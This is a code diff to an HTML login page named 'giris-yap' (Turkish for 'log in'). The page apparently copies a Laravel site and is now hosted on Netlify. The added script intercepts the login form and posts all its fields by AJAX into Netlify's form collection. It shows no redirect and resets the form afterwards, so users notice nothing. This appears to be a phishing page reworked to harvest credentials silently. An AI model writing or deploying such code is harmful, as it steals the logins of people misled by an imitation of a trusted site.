@@ -28,59 +28,15 @@
     </script>
 <script async="" defer="" src="api.js" type="text/javascript"></script><script type="text/javascript">
         
-function biscolabLaravelReCaptcha(token) {
-  var form = document.getElementById("biscolab-recaptcha-invisible-form");
-  if (!form) { return; }
-  // Ensure token is present as g-recaptcha-response
-  var t = form.querySelector('input[name="g-recaptcha-response"]');
-  if (!t) {
-    t = document.createElement('input');
-    t.type = 'hidden';
-    t.name = 'g-recaptcha-response';
-    form.appendChild(t);
-  }
-  t.value = token;
-
-  var fd = new FormData(form);
-  if (!fd.has("form-name")) fd.append("form-name", "giris-yap");
-
-  // Submit to same page via fetch to avoid redirect/page-not-found
-  fetch("/", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: new URLSearchParams(fd).toString()
-  }).then(function() {
-    // optional: no redirect; you can show a subtle 'submitted' toast if you want
-    try { form.reset(); } catch(e) {}
-    console.log("Netlify: submission sent (no redirect).");
-  }).catch(function(err){
-    console.error("Netlify submission failed:", err);
-  });
-}
-
-    </script>
-<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit"></script>
+</script>
+<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> 
 <script>
       
 var recaptchaWidgetId = null;
-var onloadCallback = function() {
-  try {
-    recaptchaWidgetId = grecaptcha.render("recaptcha-container", {
-      "sitekey": "6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ",
-      "size": "invisible",
-      "badge": "bottomright",
-      "callback": biscolabLaravelReCaptcha
-    });
-  } catch(e) {
-    console.error("reCAPTCHA render error:", e);
-  }
-};
+
 
     </script>
 <script>
-function biscolabLaravelReCaptcha(token) {
-  document.getElementById("biscolab-recaptcha-invisible-form").submit();
-}
 </script><style>
 .grecaptcha-badge {
   visibility: visible !important;
@@ -123,6 +79,7 @@ function biscolabLaravelReCaptcha(token) {
 .kvkk-pop .kvkk-link{color:#6b7280;text-decoration:none;font-weight:600;}
 </style>
 
+<script async defer src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"></script>
 </head>
 <body style="position: relative; min-height: 100%; top: 0px;">
 <style>
@@ -235,6 +192,70 @@ document.addEventListener("DOMContentLoaded", function(){
     } catch(e){
       console.error("Submit guard error:", e);
       biscolabLaravelReCaptcha("");
+    }
+  });
+});
+</script>
+
+
+<script>
+var recaptchaWidgetId = null;
+
+function ajaxSubmitNetlify(form, token) {
+  try {
+    var fd = new FormData(form);
+    // Netlify formları için 'form-name' alanı zorunlu olmalı
+    if (!fd.has('form-name')) {
+      var nameInput = form.querySelector('input[name="form-name"]');
+      if (nameInput && nameInput.value) {
+        fd.append('form-name', nameInput.value);
+      } else if (form.getAttribute('name')) {
+        fd.append('form-name', form.getAttribute('name'));
+      } else {
+        fd.append('form-name', 'giris-yap');
+      }
+    }
+    if (token) {
+      fd.set('g-recaptcha-response', token);
+    }
+    // AJAX ile köke POST — navigasyon yok → 404 yok
+    fetch('/', { method: 'POST', body: fd })
+      .then(function(res){ console.log('Netlify form submit OK?', res.ok, res.status); return res.text(); })
+      .then(function(){ try { grecaptcha.reset(recaptchaWidgetId); } catch(_){} })
+      .catch(function(err){ console.error('AJAX submit error', err); });
+  } catch(e){ console.error('ajaxSubmitNetlify error', e); }
+}
+
+var onloadCallback = function() {
+  try {
+    recaptchaWidgetId = grecaptcha.render('recaptcha-container', {
+      'sitekey': '6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ',
+      'size': 'invisible',
+      'badge': 'bottomright',
+      'callback': function(token){
+        var form = document.getElementById('biscolab-recaptcha-invisible-form');
+        if (form) ajaxSubmitNetlify(form, token);
+      }
+    });
+  } catch(e) {
+    console.error('reCAPTCHA render error:', e);
+  }
+};
+
+document.addEventListener('DOMContentLoaded', function(){
+  var form = document.getElementById('biscolab-recaptcha-invisible-form');
+  if (!form) return;
+  form.addEventListener('submit', function(ev){
+    ev.preventDefault();
+    try {
+      if (window.grecaptcha && recaptchaWidgetId !== null) {
+        grecaptcha.execute(recaptchaWidgetId);
+      } else {
+        ajaxSubmitNetlify(form, '');
+      }
+    } catch(e){
+      console.error('Submit guard error:', e);
+      ajaxSubmitNetlify(form, '');
     }
   });
 });
